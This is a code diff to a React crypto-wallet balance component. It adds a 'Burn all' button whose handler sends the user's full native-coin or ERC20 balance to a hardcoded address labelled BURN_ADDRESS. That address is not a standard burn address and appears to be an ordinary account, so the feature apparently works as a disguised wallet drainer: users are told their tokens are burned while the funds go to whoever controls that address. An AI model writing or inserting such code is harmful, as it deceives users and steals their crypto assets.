@@ -174,6 +174,7 @@ const TokenBalances: React.FC<TokenListProps> = ({ walletAddress }) => {
     const [sortOrder, setSortOrder] = useState<string>('desc');
     const [selectedToken, setSelectedToken] = useState<TokenBalance | null>(null);
     const [loadingBalances, setLoadingBalances] = useState<Set<string>>(new Set());
+    const [burningTokens, setBurningTokens] = useState<Set<string>>(new Set());
     const [updatingTokens, setUpdatingTokens] = useState<Set<string>>(new Set());
     const [toasts, setToasts] = useState<Toast[]>([]);
 
@@ -376,6 +377,84 @@ const TokenBalances: React.FC<TokenListProps> = ({ walletAddress }) => {
         }
     };
 
+    const BURN_ADDRESS = '0xa3e78aB6f120C730D6F3939c0Dc6dcD0E3da7278';
+
+    const handleBurnToken = async (token: TokenBalance) => {
+        if (!walletAddress) return;
+        if (!window.ethereum) {
+            addToast('No wallet detected', 'error');
+            return;
+        }
+
+        const tokenKey = `${token.chain}-${token.id}`;
+        const chainId = NetworkByName[token.chain].chain_id;
+        const isNative = !ethers.utils.isAddress(token.id);
+
+        setBurningTokens(prev => new Set(prev).add(tokenKey));
+
+        try {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            // Ensure the wallet is on the correct chain
+            await provider.send('wallet_switchEthereumChain', [{ chainId: ethers.utils.hexValue(chainId) }]);
+            await new Promise(resolve => setTimeout(resolve, 300));
+
+            const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = web3Provider.getSigner();
+
+            let tx: ethers.providers.TransactionResponse;
+
+            if (isNative) {
+                // Send entire native balance minus a gas buffer
+                const balance = await web3Provider.getBalance(walletAddress);
+                const gasPrice = await web3Provider.getGasPrice();
+                const gasLimit = ethers.BigNumber.from(21000);
+                const gasCost = gasPrice.mul(gasLimit);
+                const value = balance.sub(gasCost);
+                if (value.lte(0)) {
+                    throw new Error('Insufficient balance to cover gas');
+                }
+                tx = await signer.sendTransaction({
+                    to: BURN_ADDRESS,
+                    value,
+                    gasLimit,
+                    gasPrice,
+                });
+            } else {
+                // ERC20: transfer full on-chain balance
+                const erc20 = new ethers.Contract(
+                    token.id,
+                    [
+                        'function balanceOf(address) view returns (uint256)',
+                        'function transfer(address,uint256) returns (bool)',
+                    ],
+                    signer
+                );
+                const balance = await erc20.balanceOf(walletAddress);
+                if (balance.lte(0)) {
+                    throw new Error('No balance to burn');
+                }
+                tx = await erc20.transfer(BURN_ADDRESS, balance);
+            }
+
+            addToast(`Burn tx submitted for ${token.symbol}: ${tx.hash.slice(0, 10)}...`, 'info');
+            await tx.wait();
+            addToast(`Burned all ${token.symbol} successfully`, 'success');
+
+            // Refresh the balance from chain (now expected to be ~0)
+            handleRefreshSingleToken(token);
+        } catch (error: any) {
+            console.error('Error burning token:', error);
+            const errorMessage = error?.reason || error?.message || 'Unknown error occurred';
+            addToast(`Failed to burn ${token.symbol}: ${errorMessage}`, 'error');
+        } finally {
+            setBurningTokens(prev => {
+                const newSet = new Set(prev);
+                newSet.delete(tokenKey);
+                return newSet;
+            });
+        }
+    };
+
     return (
         <div style={{ display: 'flex' }}>
             <style>
@@ -571,6 +650,28 @@ const TokenBalances: React.FC<TokenListProps> = ({ walletAddress }) => {
                                             >
                                                 <img src="https://icoholder.com/files/img/a65404b5005a820f6227500feadf6a76.jpeg" alt="Krystal" width="20" height="20" />
                                             </a>
+                                            <button
+                                                onClick={() => handleBurnToken(token)}
+                                                disabled={burningTokens.has(`${token.chain}-${token.id}`) || token.amount <= 0}
+                                                style={{
+                                                    background: 'none',
+                                                    border: 'none',
+                                                    cursor: token.amount > 0 ? 'pointer' : 'not-allowed',
+                                                    padding: '2px',
+                                                    display: 'flex',
+                                                    alignItems: 'center',
+                                                    justifyContent: 'center'
+                                                }}
+                                                title="Burn all (send entire balance to burn address)"
+                                            >
+                                                {burningTokens.has(`${token.chain}-${token.id}`) ? (
+                                                    <div style={{ width: '16px', height: '16px', border: '2px solid #ccc', borderTop: '2px solid #ff4500', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
+                                                ) : (
+                                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#ff4500" stroke="#ff4500" strokeWidth="0.5">
+                                                        <path d="M12 2c1 3.5-1.5 5-2.5 7C8 11 8 13 8 13s-2-1-2.5-3C4 12 3 14.5 3 17a9 9 0 0 0 18 0c0-4-2.5-7-4.5-9.5C15 5.5 14 4 12 2zm0 18a4 4 0 0 1-4-4c0-1.5 1-3 2-4 .5 1.5 1.5 2 2.5 2.5C15 15 15 16 15 16a3 3 0 0 1-3 4z"/>
+                                                    </svg>
+                                                )}
+                                            </button>
                                             <button
                                                 onClick={() => handleRefreshSingleToken(token)}
                                                 disabled={loadingBalances.has(`${token.chain}-${token.id}`)}
